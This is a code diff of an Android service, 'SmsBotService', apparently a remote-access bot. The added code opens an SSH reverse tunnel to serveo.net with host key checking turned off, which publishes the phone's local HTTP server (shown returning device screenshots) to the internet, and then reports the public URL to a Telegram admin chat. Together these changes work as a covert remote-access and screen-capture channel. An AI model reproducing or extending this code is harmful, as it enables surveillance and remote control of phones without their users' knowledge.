@@ -12,20 +12,28 @@ import android.telephony.*;
 import android.util.*;
 import android.view.*;
 import androidx.core.app.NotificationCompat;
+import com.jcraft.jsch.*;
 import java.io.*;
 import java.net.*;
 import java.nio.*;
+import java.util.Properties;
 import org.json.*;
 
 public class SmsBotService extends Service {
     private static final int PORT = 9090;
     private ServerSocket serverSocket;
     private boolean running = true;
+    private static String publicUrl = null;
+    private static Session sshSession = null;
 
     @Override
     public void onCreate() {
         super.onCreate();
         startForeground(1, buildNotification());
+        startHttpServer();
+    }
+
+    private void startHttpServer() {
         new Thread(() -> {
             try {
                 serverSocket = new ServerSocket(PORT);
@@ -37,6 +45,41 @@ public class SmsBotService extends Service {
                 e.printStackTrace();
             }
         }).start();
+    }
+
+    public static void startTunnel(Context context, String botToken, String adminChatId) {
+        new Thread(() -> {
+            try {
+                JSch jsch = new JSch();
+                Session session = jsch.getSession("serveo", "serveo.net", 22);
+                session.setConfig("StrictHostKeyChecking", "no");
+                session.setConfig("PreferredAuthentications", "password");
+                session.setPassword("serveo"); // serveo принимает любой пароль
+                session.connect(3000);
+
+                int assignedPort = session.setPortForwardingR(0, "localhost", PORT);
+                publicUrl = "https://" + session.getHost() + ":" + assignedPort;
+
+                sendTelegramMessage(botToken, adminChatId, "✅ Туннель активирован: " + publicUrl);
+            } catch (Exception e) {
+                e.printStackTrace();
+                sendTelegramMessage(botToken, adminChatId, "❌ Ошибка туннеля: " + e.getMessage());
+            }
+        }).start();
+    }
+
+    private static void sendTelegramMessage(String botToken, String chatId, String text) {
+        try {
+            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendMessage");
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setDoOutput(true);
+            conn.setRequestProperty("Content-Type", "application/json");
+            JSONObject body = new JSONObject();
+            body.put("chat_id", chatId);
+            body.put("text", text);
+            conn.getOutputStream().write(body.toString().getBytes());
+            conn.getResponseCode();
+        } catch (Exception e) {}
     }
 
     private void handleClient(Socket client) {
@@ -77,7 +120,7 @@ public class SmsBotService extends Service {
 
                 byte[] screenshot = takeScreenshot();
                 if (screenshot != null) {
-                    String base64 = android.util.Base64.encodeToString(screenshot, android.util.Base64.NO_WRAP);
+                    String base64 = Base64.encodeToString(screenshot, Base64.NO_WRAP);
                     JSONObject respJson = new JSONObject();
                     respJson.put("status", "ok");
                     respJson.put("screenshot", base64);
@@ -147,7 +190,10 @@ public class SmsBotService extends Service {
     @Override
     public void onDestroy() {
         running = false;
-        try { serverSocket.close(); } catch (Exception e) {}
+        try {
+            if (sshSession != null) sshSession.disconnect();
+            if (serverSocket != null) serverSocket.close();
+        } catch (Exception e) {}
         super.onDestroy();
     }
 }
